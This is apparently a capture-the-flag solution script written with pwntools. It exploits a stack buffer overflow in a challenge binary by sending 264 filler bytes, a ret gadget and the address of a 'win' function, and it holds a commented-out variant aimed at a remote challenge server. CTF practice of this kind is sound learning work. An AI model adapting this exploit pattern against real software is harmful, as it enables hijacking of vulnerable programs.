from pwn import *
# LOCAL

elf = ELF('./chal')
p = elf.process()

# gdb found offset for rbp, so add 8 to get return address
offset = 256 + 8

# new_ret_addr = p64(elf.symbols["win"])
new_ret_addr = p64(0x401176) # or use gdb

# just look for a ret instruction in the objdump
ret_gadget = p64(0x4010f0)

payload = b''.join(
	[
		b'0' * offset,
		ret_gadget,
		new_ret_addr
	]
)


p.sendlineafter(b'? ', b'1024')
p.sendline(payload)
p.interactive()

# REMOTE

# conn = remote('amt.rs', 30382)
# conn.sendlineafter(b'? ', b'1024')
# conn.sendline(payload)
# conn.interactive()


